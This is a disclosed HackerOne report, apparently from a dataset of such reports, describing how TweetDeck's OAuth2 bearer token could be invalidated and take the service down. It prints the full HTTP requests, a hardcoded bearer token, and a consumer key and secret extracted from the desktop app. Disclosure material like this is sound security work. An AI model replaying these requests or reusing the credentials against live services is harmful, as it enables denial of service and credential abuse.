---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '210779'
original_report_id: '210779'
title: '[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable'
weakness: Uncontrolled Resource Consumption
team_handle: x
created_at: '2017-03-05T05:51:40.922Z'
disclosed_at: '2019-04-25T17:00:51.281Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 319
tags:
- hackerone
- uncontrolled-resource-consumption
---

# [Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable

## Metadata

- HackerOne Report ID: 210779
- Weakness: Uncontrolled Resource Consumption
- Program: x
- Disclosed At: 2019-04-25T17:00:51.281Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

First of all, really sorry for the unintentional DoS :( I was testing it with a fresh bearer token but copied the production one accidentally.

#Details
I've noticed that TweetDeck is using OAuth2 to issue requests (Authorization Bearer token):
```http
GET https://api.twitter.com/1.1/help/settings.json?settings_version= HTTP/1.1
Host: api.twitter.com
Connection: keep-alive
Authorization: Bearer AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
Origin: https://tweetdeck.twitter.com
X-Csrf-Token: 2170b7f455955368495bc191ed67c892
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/plain, */*; q=0.01
X-Twitter-Auth-Type: OAuth2Session
X-Twitter-Client-Version: Twitter-TweetDeck-blackbird-chrome/4.0.170302174617 web/
Referer: https://tweetdeck.twitter.com/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
```

According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token

Now, it can be guessed that the hardcoded bearer token used in TweetDeck belongs to the TweetDeck client. The consumer key and consumer secret can be extracted from the desktop application:

```
Consumer key:    yT577ApRtZw51q4NPMPPOQ
Consumer secret: 3neq3XqN5fO3obqwZoajavGFCUrC42ZfbrLXy5sCv8
```

Apparently, anyone can invalidate the bearer token while issuing token invalidation request:
```http
POST https://api.twitter.com/oauth2/invalidate_token HTTP/1.1
Authorization: Basic eVQ1NzdBcFJ0Wnc1MXE0TlBNUFBPUTozbmVxM1hxTjVmTzNvYnF3Wm9hamF2R0ZDVXJDNDJaZmJyTFh5NXNDdjg=
Host: api.twitter.com
Content-Length: 125
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

access_token=AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
```

And suddenly all the requests on TweetDeck result in `{"errors":[{"code":89,"message":"Invalid or expired token."}]}`.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
